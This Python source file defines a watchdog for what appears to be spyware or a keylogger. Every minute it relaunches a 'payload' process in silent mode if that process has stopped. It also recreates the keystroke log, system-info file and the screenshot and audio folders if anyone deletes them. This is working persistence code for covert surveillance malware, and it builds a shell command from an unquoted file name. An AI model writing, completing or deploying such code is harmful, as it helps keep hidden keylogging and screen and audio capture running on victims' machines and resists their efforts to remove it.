import os
import time
import threading
import subprocess
from pathlib import Path

class Watchdog:
    def __init__(self, payload_path):
        self.payload_path = payload_path
        self.running = False
        self.check_interval = 60  # seconds

    def _check_payload(self):
        """Verify payload is still running"""
        try:
            # Check if process is running by name
            cmd = f"pgrep -f {os.path.basename(self.payload_path)}"
            result = subprocess.run(cmd, shell=True, capture_output=True)
            if result.returncode != 0:
                # Payload not running, restart it
                subprocess.Popen([self.payload_path, '--silent'])
        except Exception as e:
            print(f"Watchdog error: {e}")

    def _check_files(self):
        """Verify critical files haven't been deleted"""
        critical_files = [
            'data/logs/keystrokes.log',
            'data/logs/system_info.txt',
            'data/screenshots/',
            'data/audio/'
        ]
        
        for file in critical_files:
            path = Path(file)
            if not path.exists():
                # Recreate directory if needed
                if str(path).endswith('/'):
                    path.mkdir(parents=True, exist_ok=True)
                else:
                    # Recreate empty file
                    path.parent.mkdir(parents=True, exist_ok=True)
                    path.touch()

    def start(self):
        """Start watchdog monitoring"""
        self.running = True
        while self.running:
            self._check_payload()
            self._check_files()
            time.sleep(self.check_interval)